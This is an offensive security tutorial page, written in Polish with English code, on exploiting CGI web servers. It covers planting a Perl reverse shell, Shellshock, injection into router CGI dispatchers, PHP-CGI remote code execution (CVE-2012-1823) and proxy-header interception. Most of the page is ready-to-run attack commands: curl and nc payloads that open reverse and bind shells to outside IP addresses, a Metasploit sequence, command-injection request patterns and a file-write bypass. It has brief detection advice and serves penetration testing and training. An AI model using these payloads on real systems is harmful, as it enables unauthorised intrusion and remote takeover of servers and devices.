# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## Informacje

The **CGI scripts are perl scripts**, więc jeśli przejąłeś serwer, który może wykonywać _**.cgi**_ skrypty, możesz **wgrać perl reverse shell** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\), **zmienić rozszerzenie** z **.pl** na **.cgi**, nadać **uprawnienia do wykonania** \(`chmod +x`\) i **uzyskać dostęp** do reverse shella **z poziomu przeglądarki**, aby go uruchomić.
Aby testować **CGI vulns** zaleca się użycie `nikto -C all` \(and all the plugins\)

## **ShellShock**

**ShellShock** to luka bezpieczeństwa, która dotyczy szeroko używanej powłoki **Bash** w systemach operacyjnych opartych na Unix. Wykorzystuje zdolność Bash do uruchamiania poleceń przekazywanych przez aplikacje. Luka polega na manipulacji **zmiennymi środowiskowymi**, które są dynamicznymi, nazwanymi wartościami wpływającymi na sposób uruchamiania procesów w systemie. Atakujący mogą to wykorzystać, dołączając **złośliwy kod** do zmiennych środowiskowych, który jest wykonywany po otrzymaniu zmiennej. To pozwala potencjalnie na przejęcie systemu.

Podczas eksploatacji tej luki strona może zwrócić błąd.

Możesz znaleźć tę lukę, zauważając, że używana jest stara wersja **Apache** i **cgi_mod** (z folderem cgi) lub używając **nikto**.

### **Test**

Większość testów polega na użyciu polecenia echo i oczekiwaniu, że zwrócony ciąg pojawi się w odpowiedzi web. Jeśli uważasz, że strona może być podatna, wyszukaj wszystkie strony cgi i przetestuj je.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(odbity, ślepy i poza pasmem\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### Exploit
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## Scentralizowane dispatchery CGI (trasowanie do pojedynczego endpointu przez parametry selektora)

Wiele wbudowanych interfejsów webowych multipleksuje dziesiątki uprzywilejowanych akcji za pojedynczym endpointem CGI (na przykład, `/cgi-bin/cstecgi.cgi`) i używa parametru selektora takiego jak `topicurl=<handler>`, aby przekierować żądanie do wewnętrznej funkcji.

Metodologia wykorzystania tych dispatcherów:

- Wylicz nazwy handlerów: przeszukaj JS/HTML, wykonaj brute-force przy użyciu wordlists, albo rozpakuj firmware i grepuj w poszukiwaniu ciągów handlerów używanych przez dispatcher.
- Sprawdź dostępność bez uwierzytelnienia: niektóre handlery pomijają kontrole auth i są wywoływalne bezpośrednio.
- Skoncentruj się na handlerach, które wywołują narzędzia systemowe lub operują na plikach; słabe walidatory często blokują tylko kilka znaków i mogą pominąć wiodący minus `-`.

Ogólne wzorce exploitów:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
Wykrywanie i zabezpieczanie:

- Monitoruj nieautentyfikowane żądania do scentralizowanych CGI endpoints z `topicurl` ustawionym na wrażliwe handlers.
- Oznacz parametry zaczynające się od `-` (argv option injection attempts).
- Dostawcy: wymuszaj uwierzytelnianie na wszystkich state-changing handlers, waliduj używając ścisłych allowlists/types/lengths i nigdy nie przekazuj user-controlled strings jako command-line flags.

## Stare PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

W skrócie, jeśli cgi jest aktywne i php jest "stare" \(&lt;5.3.12 / &lt; 5.4.2\) możesz wykonać kod.
Aby wykorzystać tę podatność musisz uzyskać dostęp do jakiegoś pliku PHP serwera WWW bez wysyłania parametrów \(szczególnie bez wysyłania znaku "="\).
Aby przetestować tę podatność możesz np. uzyskać dostęp do `/index.php?-s` \(zwróć uwagę na `-s`\) i **kod źródłowy aplikacji pojawi się w odpowiedzi**.

Następnie, aby uzyskać **RCE** możesz wysłać to specjalne zapytanie: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` a **PHP code** do wykonania umieścić w **body of the request**.
Przykład:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Więcej informacji o vuln i możliwych exploits:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **Proxy \(MitM — dla żądań serwera WWW\)**

CGI tworzy zmienną środowiskową dla każdego nagłówka w żądaniu HTTP. Na przykład: "host:web.com" zostaje utworzony jako "HTTP_HOST"="web.com"

Ponieważ zmienna HTTP_PROXY może być używana przez serwer WWW, spróbuj wysłać **nagłówek** zawierający: "**Proxy: &lt;IP_attacker&gt;:&lt;PORT&gt;**". Jeśli serwer wykona jakiekolwiek żądanie podczas sesji, będziesz w stanie przechwycić każde żądanie wysyłane przez serwer.

## **Referencje**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
